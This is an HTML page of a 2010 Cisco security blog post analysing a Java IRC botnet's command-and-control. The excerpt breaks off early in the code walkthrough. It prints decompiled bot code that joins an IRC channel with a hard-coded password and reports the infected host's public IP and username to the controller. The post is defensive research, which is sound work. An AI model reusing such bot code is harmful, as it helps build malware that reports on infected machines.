@@ -1,0 +1,1913 @@
+<!DOCTYPE html>
+
+<html lang="eng-US" xmlns:nitro="https://www.bunchball.com/nitro">
+
+<head>
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+	<title>  Exploring a Java Bot: Part 2</title>
+
+	<meta property="og:image" content=""/><meta property="og:description" content="When I first started this series my goal was to remove any mystery around botnets. In fact, most botnets, like this one, are relatively simple. In this post we will explore the command-and-control (C&amp;C) infrastructure, as well as the bot\'s update mechanism."/><meta name="description" content="When I first started this series my goal was to remove any mystery around botnets. In fact, most botnets, like this one, are relatively simple. In this post we will explore the command-and-control (C&amp;C) infrastructure, as well as the bot\'s update mechanism."/>	<meta property="og:site_name" content="blogs@Cisco - Cisco Blogs"/>
+
+	<meta name="google-site-verification" content="9MlQU9MMQ1jHLMUkONKe6QzZ-ZIGRv0BCD1_rY1Zdmc" />
+
+		<meta name="bitly-verification" content="25789e2a57d8"/>
+
+	<meta name="accessLevel" content="GUEST, CUSTOMER, PARTNER"/>
+
+	<meta name="language" content="en"/>
+
+	<meta name="country" content="US"/>
+
+	<meta name="contentType" content="ciscoBlogs"/>
+
+			<meta name="docType" content="blogPost" />
+
+		<link rel="stylesheet" href="https://blogs.cisco.com/wp-content/themes/cisco_responsive/style.css" type="text/css" media="screen" />
+
+	<link rel="alternate" type="application/rss+xml" title="Cisco Blog RSS Feed" href="https://blogs.cisco.com/feed" />
+
+	<link rel="shortcut icon" href="https://blogs.cisco.com/wp-content/themes/cisco_responsive/favicon.ico" />
+
+	<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+
+
+	<link rel='dns-prefetch' href='//www.cisco.com' />
+<link rel='dns-prefetch' href='//platform.twitter.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blogs.cisco.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.2"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56794,8205,9794,65039],[55358,56794,8203,9794,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='css-css'  href='https://blogs.cisco.com/wp-content/plugins/bunchball/bunchball.css?ver=4.9.2' type='text/css' media='all' />
+<link rel='stylesheet' id='normalize-css'  href='https://blogs.cisco.com/wp-content/themes/cisco_responsive/normalize.css?ver=4.9.2' type='text/css' media='all' />
+<link rel='stylesheet' id='slidebarsstyle-css'  href='https://blogs.cisco.com/wp-content/themes/cisco_responsive/slidebars.css?ver=4.9.2' type='text/css' media='all' />
+<link rel='stylesheet' id='single-css'  href='https://blogs.cisco.com/wp-content/themes/cisco_responsive/styles/single.css?ver=4.9.2' type='text/css' media='all' />
+<link rel='stylesheet' id='codecolorer-css'  href='https://blogs.cisco.com/wp-content/plugins/codecolorer/codecolorer.css?ver=0.9.14' type='text/css' media='screen' />
+<script type='text/javascript' src='https://blogs.cisco.com/wp-includes/js/jquery/jquery.js?ver=3.3.1'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.0.0'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/bunchball.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/jquery.cookie.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/jquery.slimscroll.min.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/moment.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/livestamp.min.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/modernizr.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/slidebars.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/jquery.lazyload.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/theme_script.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://www.cisco.com/assets/swa/j/blogs.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://www.cisco.com/c/dam/cdc/t/ctm.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/jquery.tools.min.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/jquery.tipTip.minified.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/jquery.sharrre.min.js?ver=4.9.2'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var single_script_vars = {"ajax_url":"https:\/\/blogs.cisco.com\/wp-admin\/admin-ajax.php","post_id":"12908"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/single.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://platform.twitter.com/widgets.js?ver=4.9.2'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blogs.cisco.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blogs.cisco.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='9 Tips to Capturing Great Video' href='https://blogs.cisco.com/partner/9_tips_to_capturing_great_video' />
+<link rel='next' title='The Cisco Intercompany Media Engine &#8211; Open Federation ShowNotes' href='https://blogs.cisco.com/cin/the_cisco_intercompany_media_engine_-_open_federation_shownotes' />
+
+<link rel="canonical" href="https://blogs.cisco.com/security/exploring-a-java-bot-part-2" />
+<link rel='shortlink' href='https://blogs.cisco.com/?p=12908' />
+
+<!-- START - Twitter Cards, G+, Facebook Tags 2.2.3.1 -->
+ <!-- Facebook Open Graph -->
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:title" content="Exploring a Java Bot: Part 2"/>
+  <meta property="og:url" content="https://blogs.cisco.com/security/exploring-a-java-bot-part-2"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2010-01-06T13:17:52+00:00"/>
+  <meta property="article:modified_time" content="2010-11-19T13:18:20+00:00" />
+  <meta property="og:updated_time" content="2010-11-19T13:18:20+00:00" />
+  <meta property="article:section" content="Security"/>
+  <meta property="article:publisher" content="https://www.facebook.com/Cisco"/>
+ <!-- Google+ / Schema.org -->
+ <!-- Twitter Cards -->
+  <meta name="twitter:title" content="Exploring a Java Bot: Part 2"/>
+  <meta name="twitter:url" content="https://blogs.cisco.com/security/exploring-a-java-bot-part-2"/>
+  <meta name="twitter:description" content="When I first started this series my goal was to remove any mystery around botnets. In fact, most botnets, like this one, are relatively simple. In this post we will explore the command-and-control (C&amp;C) infrastructure, as well as the bot&#039;s update mechanism."/>
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:creator" content="@https://twitter.com/security_craig"/>
+  <meta name="twitter:site" content="@Cisco"/>
+ <!-- SEO -->
+ <!-- Misc. tags -->
+ <!-- is_singular -->
+<!-- END - Twitter Cards, G+, Facebook Tags 2.2.3.1 -->
+	
+
+
+
+
+</head>
+
+<body>
+
+	<div id = "rewards_fix"></div>
+
+	<script src="//assets.bunchball.net/scripts/nitro/current/nitro.js" type="text/javascript"></script>	<script>
+		var apiKey = "6912c6c82ccc4863a0311dc8b586b8fb";
+		var userId = "anon";
+		var time = "1521514459";
+		var sig = "09de29ca97031be2ce0db4060bf28302";
+		var connectionParams={};
+    		connectionParams.apiKey = apiKey ;
+    		connectionParams.timeStamp = time;
+    		connectionParams.signature = sig;
+    		connectionParams.server =  "//CiscoSupportCommunities2.nitro.bunchball.net/nitro/json/";
+    		connectionParams.userId = userId;
+    	var nitro = new Nitro(connectionParams);
+    	nitro.showPendingNotifications();
+	</script> <header class = "sb-slide">
+        <div id = "hero">
+            <div class = "top_third">
+                <div id="hamburger" class = "sb-open-left">
+                    <i class="fa fa-bars"></i>
+                </div>
+            </div>
+            <div class = "top_third">
+                <div id = "cisco_logo">
+                    <div class="dropdown">
+                        <div class = "logo_hover"></div>
+                        <div class="dropdown-content">
+                            <ul>
+                                <li><a href = "https://cisco.com">All of Cisco</a></li>
+                                <li><a href = "https://blogs.cisco.com">Blogs Home</a></li>
+                            </ul>
+                         </div>
+                    </div>
+                </div>
+            </div>
+            <div class = "hero_header_text">Cisco Blogs</div>
+                <div id = "mobile_search_top">
+                    <i class="fa fa-search"></i>
+                </div>
+
+                <a class = "top_login" href = "https://socialrewards-prod.cloudapps.cisco.com/">Log In to Cisco.com</a>
+                
+                <div id = "normal_search">
+                    <div id = "normal_search_box"><form method="get" id="searchform" action="https://blogs.cisco.com/">
+
+	<input type="text" value=""
+
+    	name="s" id="s">
+
+    </input>
+
+<input type="submit" value=" " class="searchSubmit"/>
+
+</form>
+
+</div>
+                        <i class="fa fa-search"></i>
+                    <div class = "clear"></div>
+                </div>
+            <div class = "clear"></div>
+            <div id = "normal_menu">
+                <nav>
+  <a class = "hamburger_login" href = "https://blogs.cisco.com:9031/sp/startSSO.ping?PartnerIdpId=cloudsso.cisco.com">Log In to Cisco.com</a>      <ul>
+                  <li><a href='https://blogs.cisco.com'><span>All Blogs</span></a></li>
+                  <li><a href='#'><span>Technologies</span></a>
+                  <ul>
+            <div class = "bordertop"></div>
+            <li><a href="https://blogs.cisco.com/analytics-automation">Analytics &amp; Automation</a></li>
+            <li><a href="https://blogs.cisco.com/cloud">Cloud</a></li>
+            <li><a href='https://blogs.cisco.com/collaboration'>Collaboration</a></li>
+            <li><a href='https://blogs.cisco.com/datacenter'>Data Center</a></li>
+            <li><a href='https://blogs.cisco.com/digital'>Digital Transformation</a></li>
+            <li><a href='https://blogs.cisco.com/enterprise'>Enterprise Networks</a></li>
+            <li><a href='https://blogs.cisco.com/innovation'>Innovation</a></li>
+            <li><a href='https://blogs.cisco.com/wireless'>Mobility</a></li>
+            <li><a href='https://blogs.cisco.com/security'>Security</a></li>
+            <li class = "sub"><a href="https://blogs.cisco.com/talos" class="nav_menu" title="">Threat Research</a></li>
+            <li><a href='https://blogs.cisco.com/smallbusiness'>Small Business</a></li>
+            <li><a href='https://blogs.cisco.com/services'>Services</a></li>
+            <li><a href='https://blogs.cisco.com/sp'>SP360:Service Provider</a></li>
+          </ul>
+        </li>
+                  <li><a href='#'><span>Industries</span></a>
+                      <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/education'>Education</a></li>
+            <li><a href='https://blogs.cisco.com/energy'>Energy</a></li>
+            <li><a href='https://blogs.cisco.com/financialservices'>Financial Services</a></li>
+            <li><a href='https://blogs.cisco.com/government'>Government</a></li>
+            <li><a href='https://blogs.cisco.com/healthcare'>Healthcare</a></li>
+            <li><a href='https://blogs.cisco.com/manufacturing'>Manufacturing</a></li>
+            <li><a href='https://blogs.cisco.com/retail'>Retail &amp; Hospitality</a></li>
+          </ul>
+        </li>
+                  <li><a href='#'><span>Partners</span></a> 
+          <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/partner'>Partner</a></li>
+          </ul>
+        </li>
+        <li><a href='#'><span>For the Tech Expert</span></a>           <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/getyourbuildon'>Architects &amp; Distinguished Engineers</a></li>
+            <li><a href='https://blogs.cisco.com/developer'>Developer</a></li>
+            <li><a href='https://blogs.cisco.com/performance'>High Performance Computing</a></li>
+            <li><a href='https://blogs.cisco.com/ciscoit'>Inside Cisco IT</a></li>
+            <li><a href='https://blogs.cisco.com/cin'>TechWiseTV</a></li>
+          </ul>
+        </li>
+         <li><a href='#'><span>Get to Know Cisco</span></a>           <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/csr'>Corporate Social Responsibility</a></li>
+            <li><a href='https://blogs.cisco.com/cle'>Connected Life Exchange</a></li>
+            <li><a href='https://blogs.cisco.com/customerstories'>Customer Stories</a></li>
+            <li><a href='https://blogs.cisco.com/socialmedia'>Digital and Social Media</a></li>
+            <li><a href='https://blogs.cisco.com/gov'>High Tech Policy</a></li>
+            <li><a href='https://blogs.cisco.com/diversity'>Inclusion and Diversity</a></li>
+            <li><a href='https://blogs.cisco.com/lifeatcisco'>Life at Cisco</a></li>
+            <li><a href='https://blogs.cisco.com/perspectives'>Perspectives</a></li>
+            <li><a href='https://blogs.cisco.com/news'>Executive Platform: News &amp; Insights</a></li>
+          </ul>
+        </li>
+        <li class = "countries"><a href='#'><span>Countries and Regions</span></a>
+          <ul>
+            <div class = "col_1">
+  <li><a href="https://apjc.thecisconetwork.com/">Asia Pacific</a>
+  <li><a href="https://gblogs.cisco.com/at/">Austria</a>
+  <li><span class = "sub_main">Belgium</span></li>
+    <li class = "sub"><a href="https://gblogs.cisco.com/be">Dutch</a></li>
+    <li class = "sub"><a href="https://gblogs.cisco.com/be-fr">French</a></li>
+  <li><a href="https://gblogs.cisco.com/br/">Brazil</a>
+  <li><span class = "sub_main">Canada</span></li>
+    <li class = "sub"><a href="https://canadablog.cisco.com/">English</a></li>
+    <li class = "sub"><a href="https://ciscocanadafr.wordpress.com/">French</a></li>
+
+  </div>
+    <div class = "col_2">
+    <li><a href="https://gblogs.cisco.com/fin/">Finland</a>
+    <li><a href="https://gblogs.cisco.com/fr/">France</a>
+
+  <li><a href="https://gblogs.cisco.com/de">Germany</a></li>
+  <li><a href="https://gblogs.cisco.com/gr/">Greece</a>
+  <li><a href="https://gblogs.cisco.com/in">India</a></li>
+  <li><a href="https://gblogs.cisco.com/it/">Italy</a></li>
+  <li><a href="https://gblogs.cisco.com/jp/">Japan</a></li>
+  <li><a href="https://ciscokrblog.com/">Korea</a></li>
+
+  </div>
+  <div class = "col_3">
+  <li><span class = "sub_main">Latin America</span></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/la/">Latin America (Esp)</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/cansac/">Cansac</a></li>
+  <li><a href="https://gblogs.cisco.com/nl/">Netherlands</a></li>
+  <li><a href="https://gblogs.cisco.com/no">Norway</a></li>
+  <li><a href="https://gblogs.cisco.com/pl">Poland</a></li>
+  <li><a href="https://gblogs.cisco.com/pt">Portugal</a></li>
+  <li><a href="https://gblogs.cisco.com/ro">Romania</a></li>
+  </div>
+
+  <div class = "col_4">
+  <li><a href="https://gblogs.cisco.com/ru">Russia</a></li>
+  <li><a href="https://gblogs.cisco.com/es">Spain</a></li>
+  <li><span class = "sub_main">Switzerland</span></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-tech/">English</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-fr/">French</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-de/">German</a></li>
+  <li><a href="https://gblogs.cisco.com/tr/">Turkey</a></li>
+  <li><a href="https://gblogs.cisco.com/uki/">UK &amp; Ireland</a></li>
+</div>
+<div class = "clear"></div>
+</ul>
+</li>
+      </ul>
+</nav>
+            </div>
+            <div id = "mobile_search">
+                <div id = "mobile_search_box">
+                    <form method="get" id="searchform" action="https://blogs.cisco.com/">
+
+	<input type="text" value=""
+
+    	name="s" id="s">
+
+    </input>
+
+<input type="submit" value=" " class="searchSubmit"/>
+
+</form>
+
+                </div>
+        </div>
+        </div>  
+    </header>
+     
+        
+  <div id="share_bar1">
+
+    <span class = "share_title">Share</span>
+    <div class="twitter sharrre">
+      <div class = "box">
+        <div class = "count twitcount"></div>
+        <a class = "twitclick" href="https://twitter.com/intent/tweet?url=http://bit.ly/1zVfiLx&text=Exploring a Java Bot: Part 2&via=ciscosecurity" data-config-metrics-group='social_shares' data-config-metrics-title='twitter_shares' data-config-metrics-item='twitter_share'>tweet</a>
+      </div>
+    </div>
+
+    <div class="facebook sharrre">
+      <div class = "box">
+        <div class = "count fbcount"></div>
+        <a class = "fbclick share" href = "http://www.facebook.com/sharer/sharer.php?u=https://blogs.cisco.com/security/exploring-a-java-bot-part-2&title=Exploring a Java Bot: Part 2" data-config-metrics-group='social_shares' data-config-metrics-title='facebook_shares' data-config-metrics-item='facebook_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+      </div>
+    </div>
+
+
+    <div class="linkedin sharrre">
+      <div class = "box">
+        <div class = "count licount"></div>
+        <a class = "liclick share" href = "https://www.linkedin.com/cws/share?url=https://blogs.cisco.com/security/exploring-a-java-bot-part-2" data-title=" " data-config-metrics-group='social_shares' data-config-metrics-title='linkedin_shares' data-config-metrics-item='linkedin_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+
+
+      </div>
+    </div>
+
+    <div class="googleplus sharrre">
+      <div class = "box">
+        <div class = "count gpcount"></div>
+        <a class = "gpclick share" href="https://plus.google.com/share?url=https://blogs.cisco.com/security/exploring-a-java-bot-part-2" data-title=" " data-config-metrics-group='social_shares' data-config-metrics-title='google_shares' data-config-metrics-item='google_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+      </div>
+    </div>
+        <div class = "share_mail"><a class="email emclick" href="mailto:?subject=Cisco Blog: Exploring a Java Bot: Part 2&body=I saw this post on Cisco Security blog and thought you might like to read it.%0A%0AExploring a Java Bot: Part 2%0A%0Ahttps://blogs.cisco.com/security/exploring-a-java-bot-part-2%0A%0A****Disclaimer****%0A%0ACisco is not responsible for the content of this email, and its contents do not necessarily reflect Cisco’s views or opinions. Cisco has not verified the email address or name of the sender." data-config-metrics-group='social_shares' data-config-metrics-title='email_shares' data-config-metrics-item='email_share'></a></div>
+    <div class = "clear"></div>
+  </div>
+  <div id="sb-site">
+<div id = "main_content">
+
+	<div id = "blog_content">
+	<div id = "main_left">
+
+		<article id = "article_post">
+			<p class = "breadcrumb">
+			<a href=' https://blogs.cisco.com'>Cisco Blog</a> > <a href=' https://blogs.cisco.com/category/security/'>Security</a></p>
+					<div id = "post_image"><img src = "https://alln-extcloud-storage.cisco.com/ciscoblogs/category50.png">  					</div>
+  					<div id = "post_info">
+  						<span class = "post_category">
+  							Security  						</span>
+						<h1 id="post-12908" class="kindle_title title">Exploring a Java Bot: Part 2</h1>
+						<div class="author_image"><img class = "img-circle" src = "https://alln-extcloud-storage.cisco.com/ciscoblogs/userphoto/1461608835-bpthumb.jpg"></div><div class="author_rewards_box">			<ul class = "nitro_author12908 bunchballAwards">
+		<li>
+			<div class = "nitro_badge badgenitro_author12908">
+			</div>
+			<div class = "nitro_points pointsnitro_author12908">
+			</div>
+		</li>
+		<script>
+var nitroName = 'craiwill';
+var sessionKey = '';
+
+
+nitro.callAPI("method=batch.run&methodFeed=%5B%27method%3Duser.getChallengeProgress%26userId%3D" + nitroName + "%26sessionKey%3D" + sessionKey + "%27%2C%27method%3Duser.getLevel%26userIds%3D" + nitroName + "%26sessionKey%3D" + sessionKey + "%27%2C%27method%3Duser.getPointsBalance%26userId%3D" + nitroName + "%26sessionKey%3D" + sessionKey + "%27%5D",  "postBadges", "nitro_author12908");</script>
+
+		</ul>
+		</ul>
+	<div class = "clear"></div>
+</div><div class = "clear"></div><span class = "list_author"><a href="https://blogs.cisco.com/author/craigwilliams" title="Posts by Craig Williams" rel="author">Craig Williams</a> - January 6, 2010 - 0 Comments      					</span>
+      					<br />
+      					<br />
+      										</div>
+					<div class ="clear"></div>
+					<div id ="content">
+					<style type="text/css">
+div.scrollable  {
+    overflow: auto;
+    <font color="red">height</font>: 400px;
+    <font color="red">width</font>: auto;
+}
+td.linenos { background-color: #f0f0f0; padding-right: 10px; }
+span.lineno { background-color: #f0f0f0; padding: 0 5px 0 5px; }</p>
+<p>/* For Pygmentized text */
+body  { background: #f8f8f8; }
+body .c { color: #408080; font-style: italic } /* Comment */
+body .err { border: 1px solid #FF0000 } /* Error */
+body .k { color: #008000; font-weight: bold } /* Keyword */
+body .o { color: #666666 } /* Operator */
+body .cm { color: #408080; font-style: italic } /* Comment.Multiline */
+body .cp { color: #BC7A00 } /* Comment.Preproc */
+body .c1 { color: #408080; font-style: italic } /* Comment.Single */
+body .cs { color: #408080; font-style: italic } /* Comment.Special */
+body .gd { color: #A00000 } /* Generic.Deleted */
+body .ge { font-style: italic } /* Generic.Emph */
+body .gr { color: #FF0000 } /* Generic.Error */
+body .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+body .gi { color: #00A000 } /* Generic.Inserted */
+body .go { color: #808080 } /* Generic.Output */
+body .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+body .gs { font-weight: bold } /* Generic.Strong */
+body .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+body .gt { color: #0040D0 } /* Generic.Traceback */
+body .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+body .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+body .kp { color: #008000 } /* Keyword.Pseudo */
+body .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+body .kt { color: #B00040 } /* Keyword.Type */
+body .m { color: #666666 } /* Literal.Number */
+body .s { color: #BA2121 } /* Literal.String */
+body .na { color: #7D9029 } /* Name.Attribute */
+body .nb { color: #008000 } /* Name.Builtin */
+body .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+body .no { color: #880000 } /* Name.Constant */
+body .nd { color: #AA22FF } /* Name.Decorator */
+body .ni { color: #999999; font-weight: bold } /* Name.Entity */
+body .ne { color: #D2413A; font-weight: bold } /* Name.Exception */
+body .nf { color: #0000FF } /* Name.Function */
+body .nl { color: #A0A000 } /* Name.Label */
+body .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+body .nt { color: #008000; font-weight: bold } /* Name.Tag */
+body .nv { color: #19177C } /* Name.Variable */
+body .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+body .w { color: #bbbbbb } /* Text.Whitespace */
+body .mf { color: #666666 } /* Literal.Number.Float */
+body .mh { color: #666666 } /* Literal.Number.Hex */
+body .mi { color: #666666 } /* Literal.Number.Integer */
+body .mo { color: #666666 } /* Literal.Number.Oct */
+body .sb { color: #BA2121 } /* Literal.String.Backtick */
+body .sc { color: #BA2121 } /* Literal.String.Char */
+body .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+body .s2 { color: #BA2121 } /* Literal.String.Double */
+body .se { color: #BB6622; font-weight: bold } /* Literal.String.Escape */
+body .sh { color: #BA2121 } /* Literal.String.Heredoc */
+body .si { color: #BB6688; font-weight: bold } /* Literal.String.Interpol */
+body .sx { color: #008000 } /* Literal.String.Other */
+body .sr { color: #BB6688 } /* Literal.String.Regex */
+body .s1 { color: #BA2121 } /* Literal.String.Single */
+body .ss { color: #19177C } /* Literal.String.Symbol */
+body .bp { color: #008000 } /* Name.Builtin.Pseudo */
+body .vc { color: #19177C } /* Name.Variable.Class */
+body .vg { color: #19177C } /* Name.Variable.Global */
+body .vi { color: #19177C } /* Name.Variable.Instance */
+body .il { color: #666666 } /* Literal.Number.Integer.Long */
+  </style>
+<p>When I first started this series my goal was to remove any mystery around <font color="red">botnets</font>. In fact, most <font color="red">botnets</font>, like this one, are relatively simple. In this post we will explore the command-and-control (C&amp;C) infrastructure, as well as the <font color="red">bot</font>&#8217;s update mechanism.</p>
+<p>A C&amp;C interface is the primary <font color="red">user</font> interface between the <font color="red">botmaster</font> and the legion of infected hosts participating in the <font color="red">botnet</font>. Since it is present in every <font color="red">botnet</font> (although there are many different types of interfaces), it is one of the primary things we look for when attempting to determine if any machines have been compromised. From a <font color="red">botmaster</font>&#8217;s perspective, it would seem that this is a key feature that must be carefully designed to avoid <font color="red">detection</font>. But surprisingly, a very large percentage we see are very simple, just like this one. That said, at times it can be very much a cat-and-mouse game between <font color="red">botmasters</font> and people in my industry.</p>
+<p>Remotely controlling multiple machines is a basic principal that <font color="red">botmasters</font> must address.  You need to be able to command your <font color="red">nodes</font> in a fairly efficient manner. If you have 10,000 <font color="red">nodes</font> you do not want to issue a command 10,000 times. You want to issue it once and have all 10,000 <font color="red">nodes</font> respond in a timely manner so that you know if the command was successful. </p>
+<p>In this example the author decided to use internet relay chat (<font color="red">IRC</font>). The use of <font color="red">IRC</font> is very  common among simple <font color="red">bots</font> since it&#8217;s easy to understand and there are lots of implementations publicly available. There is a trade off though: because <font color="red">IRC</font> is a well-documented protocol, it is extremely easy to detect and monitor.<a href="http://www.cisco.com/web/about/security/intelligence/bots.html" target="_blank"> Infiltrating a <font color="red">Botnet</font></a> that is IRC-based is a trivial task. Some <font color="red">botnets</font> try to mitigate this issue by doing things like requiring <font color="red">server</font> and <font color="red">channel</font> <font color="red">passwords</font> or even using SSL <font color="red">encryption</font>, but none of those efforts are really effective. <font color="red">Passwords</font> are easily sniffed off a <font color="red">network</font> and anything being encrypted can be spied on with a debugger.<br />
+<span id="more-12908"></span><br />
+Now into the code!</p>
+<p>Inside of main you will notice that the <font color="red">bot</font>&#8217;s command-and-control is IRC-based. By default, the <font color="red">botnet</font> uses the clever <font color="red">password</font> &#8220;lolwhat&#8221;. As with any program, before use ensure the default <font color="red">password</font> is changed 😉</p>
+<div class="scrollable">
+<div class="highlight">
+<pre><span class="k"></span> <span class="nn"></span><span class="o"></span>
+
+
+
+<span class="n">IRC</span><span class="o">.</span><span class="na">sendRawData</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="s">&quot;NICK &quot;</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getNick</span><span class="o">()).</span><span class="na"><font color="red">toString</font></span><span class="o">());</span>
+
+
+
+<span class="n">IRC</span><span class="o">.</span><span class="na">sendRawData</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="s">&quot;JOIN &quot;</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">()).</span><span class="na"><font color="red">toString</font></span><span class="o">());</span>
+
+
+
+<span class="n">IRC</span><span class="o">.</span><span class="na">pass</span><span class="o">(</span><span class="s">&quot;lolwat&quot;</span><span class="o">);</span>
+
+<span class="n">IRC</span><span class="o">.</span><span class="na">nick</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getNick</span><span class="o">());</span>
+
+
+
+<span class="n">IRC</span><span class="o">.</span><span class="na">user</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getNick</span><span class="o">(),</span> <span class="n">Misc</span><span class="o">.</span><span class="na">getIPAddress</span><span class="o">(</span><span class="s">&quot;http://whatismyip.com/automation/n09230945.asp&quot;</span><span class="o">),</span> <span class="n">Config</span><span class="o">.</span><span class="na">getConnect</span><span class="o">(),</span> <span class="n">Misc</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
+
+
+
